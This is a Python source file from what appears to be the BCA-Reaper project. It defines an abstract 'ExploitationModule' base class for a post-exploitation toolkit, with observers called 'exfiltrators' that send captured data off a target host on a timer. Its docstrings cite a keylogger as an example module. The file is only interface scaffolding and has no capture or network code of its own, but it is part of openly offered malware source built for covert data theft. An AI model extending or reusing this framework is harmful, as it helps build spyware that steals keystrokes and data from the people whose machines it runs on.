#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Reaper

__author__ = "EONRaider @ keybase.io/eonraider"

import platform
from abc import abstractmethod, ABC
from datetime import datetime


class ExploitationModule(ABC):
    def __init__(self, exfil_time: [float, None]):
        """Interface for the implementation of exploitation modules.

        :param exfil_time: Time in seconds to wait between periodic
            executions of the exfiltration of logged data. Set to
            None to perform a single operation.
        """
        self.exfil_time = exfil_time
        self._exfiltrators = list()
        self.tag = f"{self.__class__.__name__}::{platform.node()}"

    def register_exfiltrator(self, exfiltrator) -> None:
        """Register an observer to enable output or exfiltration of
        captured data from the target host."""
        self._exfiltrators.append(exfiltrator)

    def _notify_all_exfiltrators(self, message) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        [exfiltrator.update(message) for exfiltrator in self._exfiltrators]

    def report(self) -> [str, None]:
        """Get a report based on the data buffered by the
        ExploitationModule as a string consisting of a tag, timestamp
        and the data itself."""
        timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
        header = f"[{self.tag}] @ {timestamp}"
        '''The standard report is formatted as follows:
        [KeyLogger::hostname] @ 10/16/2021 13:30:20 - my data'''
        return f"{header} - {self.contents}" if len(self.contents) > 0 else None

    @property
    @abstractmethod
    def contents(self):
        """Get a representation of the data made available by the
        module for exfiltration."""
        ...

    @abstractmethod
    def execute(self, *args, **kwargs):
        """To be implemented with the logic specific to each
        exploitation mechanism."""
        ...
